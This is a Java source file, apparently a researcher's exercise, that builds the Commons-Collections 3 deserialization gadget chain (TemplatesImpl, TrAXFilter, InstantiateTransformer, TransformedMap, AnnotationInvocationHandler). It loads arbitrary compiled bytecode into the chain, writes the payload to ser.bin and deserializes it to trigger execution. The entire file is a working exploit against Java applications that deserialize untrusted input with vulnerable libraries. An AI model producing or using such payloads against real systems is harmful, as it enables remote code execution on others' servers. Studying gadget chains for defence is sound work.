package com.t4rrega.ser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3_TemplatesImpl {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Files.readAllBytes(Paths.get("/Users/t4rrega/JavaProjects/javaDemo/target/classes/test.class"));
        TemplatesImpl obj = new TemplatesImpl();
        SerTools.setFieldValue(obj, "_bytecodes", new byte[][] {bytes});
        SerTools.setFieldValue(obj, "_name", "HelloTemplatesImpl");
        SerTools.setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[] {Templates.class}, new Object[] {obj})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
        HashMap hashmap = new HashMap();
        hashmap.put("value", "asdf");
        Map transformedMap = TransformedMap.decorate(hashmap, null, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object ins = annotationInvocationHandlerConstructor.newInstance(java.lang.annotation.Retention.class, transformedMap);

        SerTools.setFieldValue(chainedTransformer, "iTransformers", transformers);
        SerTools.serialize(ins, "ser.bin");
        SerTools.unserialize("ser.bin");
    }
}
